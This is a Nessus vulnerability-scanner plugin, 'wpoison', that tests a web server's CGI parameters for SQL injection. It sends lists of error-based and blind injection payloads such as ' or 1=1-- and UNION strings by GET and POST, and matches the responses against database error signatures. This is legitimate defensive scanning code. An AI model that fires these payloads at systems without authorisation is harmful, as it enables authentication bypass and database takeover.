#
# This script was written by John Lampe ... j_lampe@bellsouth.net
#
# Initial version of script was based (loosely) on wpoison by M.Meadele mm@bzero.net
# See http://wpoison.sourceforge.net
#
# See the Nessus Scripts License for details
#
#
# re-worked Aug 20, 2004 : jwlampe -at- tenablesecurity.com adds POST checks 
# June/July 2005	 : jwlampe -at- tenablesecurity.com adds Blind SQL Injection checks
# April 2006		 : commit some false negative fixes from Richard Moore


if(description)
{
 script_id(11139);
#script_cve_id("CVE-MAP-NOMATCH");
 script_version ("$Revision: 1.29 $");
 name["english"] = "wpoison (nasl version)";
 script_name(english:name["english"]);
 
 desc["english"] = "
This script attempts to use SQL injection techniques on CGI scripts

More info at : http://www.securitydocs.com/library/2651


Solution : Modify the relevant CGIs so that they properly escape arguments.

Risk factor : High";



 script_description(english:desc["english"]);
 
 summary["english"] = "Some common SQL injection techniques";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2002 John Lampe...j_lampe@bellsouth.net");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "webmirror.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

single_quote = raw_string(0x27);

poison[0] = single_quote + "UNION" + single_quote;
poison[1] = single_quote;
poison[2] = single_quote + "%22";
poison[3] = "9%2c+9%2c+9";
poison[4] = single_quote + "bad_bad_value";
poison[5] = "bad_bad_value" + single_quote;
poison[6] = single_quote + "+OR+" + single_quote;
poison[7] = single_quote + "WHERE";
poison[8] = "%3B"; # semicolon
poison[9] = single_quote + "OR";
# methods below from http://www.securiteam.com/securityreviews/5DP0N1P76E.html
poison[10] = single_quote + " or 1=1--";
poison[11] = " or 1=1--";
poison[12] = single_quote + " or " + single_quote + "a" + single_quote + "=" + single_quote + "a";
poison[13] = single_quote + ") or (" + single_quote + "a" + single_quote + "=" + single_quote + "a";
poison[14] = "char(0x27)";
poison[15] = "char(0x27)" + "/**/UNION/**/" + "char(0x27)";
poison[16] = "char(0x27)" + "%22";
poison[17] = "char(0x27)" + "/**/OR/**/" + "char(0x27)";


# blind sql injection methods that we will pass
# if they are putting the user-supplied variable within single quotes, then we trick them with this
blinder[0] = single_quote + "+AND+" + single_quote + "a" + single_quote + ">" + single_quote + "b";
# otherwise, this will work most of the time
blinder[1] = "+AND+1=1";
blinder[2] = "char(0x27)" + "/**/AND/**/" + "char(0x27)" + "a" + "char(0x27)" + ">" + "char(0x27)" + "b";
blinder[3] = "/**/AND/**/1=1";


posreply[0] = "Can't find record in";
posreply[1] = "Column count doesn't match value count at row";
posreply[2] = "error " + single_quote;
posreply[3] = "Incorrect column name";
posreply[4] = "Incorrect column specifier for column";
posreply[5] = "Invalid parameter type";
posreply[6] = "Microsoft OLE DB Provider for ODBC Drivers error";
posreply[7] = "ODBC Microsoft Access Driver";
posreply[8] = "ODBC SQL Server Driver";
posreply[9] = "supplied argument is not a valid MySQL result";
posreply[10] = "mysql_query()";
posreply[11] = "Unknown table";
posreply[12] = "You have an error in your SQL syntax";
posreply[13] = "Error Occurred While Processing Request";
posreply[14] = "Syntax";
posreply[15] = "not a valid MySQL result resource";
posreply[16] = "unexpected end of SQL command";
posreply[17] = "mySQL error with query";
posreply[18] = "Can't connect to local";
posreply[19] = "ADODB.Recordset";
posreply[20] = "Unclosed quotation mark before the character string";
posreply[21] = "Incorrect syntax near";
posreply[22] = "PostgreSQL query failed:";
posreply[23] = "not a valid PostgreSQL result";
posreply[24] = "An illegal character has been found in the statement";
posreply[25] = "[IBM][CLI Driver][DB2/6000]";
posreply[26] = "Unable to connect to PostgreSQL server:";

posregex[0] = string("ORA-[0-9]{5}[^0-9]");

port = get_http_port(default:80);

if(! get_port_state(port))
	exit(0);
unsafe_urls = "";
mywarningcount = blindwarningcount = 0;


name = string("www/", port, "/cgis");
cgi = get_kb_item(name);
if(! cgi)
	exit(0);

# populate two arrays param[] and data[]  
everythingrray = split(cgi, sep:" ", keep:FALSE);    

if (everythingrray[0] =~ ".*/$")
{
	isdir = 1;
}
else
{
	isdir = 0;
}

if (! isdir)
{
	# so, vrequest is just the base cgi without the arguments
	vrequest = string(everythingrray[0],"?");			
	# bogus_vrequest is the base cgi with the added string "?<some integer>"
	bogus_vrequest = string(everythingrray[0],"?",rand());
	pseudocount = 0;
	foreach rrayval (everythingrray)
	{
		if (pseudocount >= 2)
		{
			if ("]" >< rrayval)
			{
				pseudocount--;
				tmpf = ereg_replace(pattern:"\[|\]", string:rrayval, replace:"");
				data[pseudocount] = tmpf;
				vrequest = string(vrequest,"=",tmpf);				
				
			}
			else
			{
				param[pseudocount] = rrayval;
				if (pseudocount == 2)
				{
					vrequest = string(vrequest,rrayval);
				}
				else
				{
					vrequest = string(vrequest,"&",rrayval);
				}
			}
		}	
		else
		{
			param[pseudocount] = rrayval;
		}
		pseudocount++;
	}
}

for (z=2; param[z]; z = z + 1) 
{
	blind = '';					
	url = vrequest;
	req = http_get(item:url, port:port);
        res = http_keepalive_send_recv(port:port, data:req);

        if ( ( res == NULL ) || (! egrep(string:res, pattern:"^HTTP/1\..*(200 OK|302)")) )
        {
                exit(0);
        }

	res_saved = strstr(res,string("\r\n\r\n"));
	req = http_get(item:bogus_vrequest, port:port);
	bres = http_keepalive_send_recv(port:port, data:req);

# This breaks detecting a trivially injectable CGI
#	if (egrep(string:bres, pattern:"^HTTP/1\..*200 OK"))
#	{
#		exit(0);
#	}


# This breaks detecting a trivially injectable CGI
#        for ( i = 0; posreply[i]; i ++ )
#        {
#         	if ( posreply[i] >< res ) {
#			exit(0);
#                }
#        }

      	for (poo=0; poison[poo]; poo = poo + 1) 
	{
		doblind = 0;
		# qa will be the string which should be an error...i.e. just the request with a single quote
		qa = '';
        	url = string(param[0],"?");
		blind = string(param[0],"?");		
        	for (i=2 ; param[i]; i = i + 1) 
		{
      			if (i == z) 
			{
				if (blinder[poo])
				{
					doblind++;
					qa = string(blind,param[i],"=",data[i],"'");
					blind = string(blind,param[i],"=",data[i], blinder[poo]);        
				}
          			if (data[i]) 
				{
        				url = string(url,param[i],"=",poison[poo]);
          			} 
				else 
				{
              				url = string(url,param[i],"=",poison[poo]);
          			}
      			} 
			else 
			{
				if (blinder[poo])
				{
					qa = string(qa,param[i],"=",data[i]);
					blind = string(blind,param[i],"=",data[i]);		
				}
          			if (data[i]) 
				{
              				url = string(url,param[i],"=",data[i]);
          			} 
				else 
				{
              				url = string(url,param[i],"=");
          			}
      			}
      			if (param[i + 1]) 
			{
				url = string(url,"&");
				blind = string(blind,"&");
				qa = string(qa,"&");
			}
        	}
        
        
		req = http_get(item:url, port:port);

		inbuff = http_keepalive_send_recv(port:port, data:req);
		if( inbuff == NULL ) 
			exit(0);
        	for (mu=0; posreply[mu]; mu = mu + 1) 
		{
            		if (posreply[mu] >< inbuff ) 
			{
          			unsafe_urls = string(unsafe_urls, url, "\n");
          			mywarningcount = mywarningcount + 1;
      			}
        	}

		# loop thru the posregex[] array
		for (preg=0; posregex[preg]; preg++)
		{
			if (egrep(string:inbuff, pattern:posregex[preg]))
			{
				unsafe_urls = string(unsafe_urls, url, "\n");
				mywarningcount = mywarningcount + 1;
			}
		}

		if (doblind > 0)
		{
			req_blind = http_get(item:blind, port:port);			
			# the logic here is we will send the blind query with valid SQL attached to a parameter
			# and ensure that the headers are the same as when we sent a valid query
			# we next send a non-valid SQL statement attached to a parameter and ensure that
			# it generates a different response
			inbuff = http_keepalive_send_recv(port:port, data:req_blind);
                	if( inbuff == NULL )
                        	exit(0);

			buff_body = strstr(inbuff,string("\r\n\r\n"));
			if (buff_body == res_saved)						
			{								
				req_qa = http_get(item:qa, port:port);
				inbuff = http_keepalive_send_recv(port:port, data:req_qa);
				qa_body = strstr(inbuff,string("\r\n\r\n"));
				if (qa_body != res_saved)
				{
					blind_urls = string(blind_urls, blind, "\n");		
					blindwarningcount = blindwarningcount + 1;		
				}
			}								
		}

		if ( safe_checks() == 0 )
		{
			
                	# create a POST req  
                	tmppost = split(url, sep:"?", keep:FALSE);
                	mypostdata = tmppost[1];
                	postreq = http_post(item:param[0], port:port, data:mypostdata);


			# Test the POST req
			inbuff = http_keepalive_send_recv(port:port, data:postreq);
			if ( inbuff == NULL )
				exit(0);
                	for (mu=0; posreply[mu]; mu = mu + 1)
                	{
                        	if (posreply[mu] >< inbuff )
                        	{
                                	unsafe_urls = string(unsafe_urls, url, "\n");
                                	mywarningcount = mywarningcount + 1;
                        	}
                	}

	                # loop thru the posregex[] array
        	        for (preg=0; posregex[preg]; preg++)
                	{
                        	if (egrep(string:inbuff, pattern:posregex[preg]))
                        	{
                                	unsafe_urls = string(unsafe_urls, url, "\n");
                                	mywarningcount = mywarningcount + 1;
                        	}
                	}

			
			if (doblind > 0)
			{
				# create a blind POST req                                       
                		tmppost = split(blind, sep:"?", keep:FALSE);                      
                		mypostdata = tmppost[1];                                        
                		postreq = http_post(item:param[0], port:port, data:mypostdata); 

                		inbuff = http_keepalive_send_recv(port:port, data:postreq);     
                		if ( inbuff == NULL )                                           
                        		exit(0);                                                

 				buff_body = strstr(inbuff,string("\r\n\r\n"));

                        	if (buff_body == res_saved)
                		{                                                               
					qapost = split(blind, sep:"?", keep:FALSE);
					qapostdata = tmppost[1];
					qareq = http_post(item:param[0], port:port, data:qapostdata);
					qabuff = http_keepalive_send_recv(port:port, data:qareq);
					qa_body = strstr(qabuff,string("\r\n\r\n"));

					if (qa_body != res_saved)
					{
                        			blind_urls = string(blind_urls, blind, "\n");           
                        			blindwarningcount = blindwarningcount + 1;              
					}
                		}                                                               
			}
		}
		# end the non-safe check
      	}
}			

if (mywarningcount > 0) 
{
        report = string("
The following URLs seem to be vulnerable to various SQL injection
techniques : \n\n", 
		unsafe_urls,
		"\n\n
An attacker may exploit this flaws to bypass authentication
or to take the control of the remote database.


Solution : Modify the relevant CGIs so that they properly escape arguments
Risk factor : High
See also : http://www.securiteam.com/securityreviews/5DP0N1P76E.html");

        
        security_hole(port:port, data:report);
}




if (blindwarningcount > 0)
{
        report = string("
The following URLs seem to be vulnerable to BLIND SQL injection
techniques : \n\n",
                blind_urls,
                "\n\n
An attacker may exploit this flaws to bypass authentication
or to take the control of the remote database.


Solution : Modify the relevant CGIs so that they properly escape arguments
Risk factor : High
See also : http://www.securitydocs.com/library/2651");


        security_hole(port:port, data:report);
}
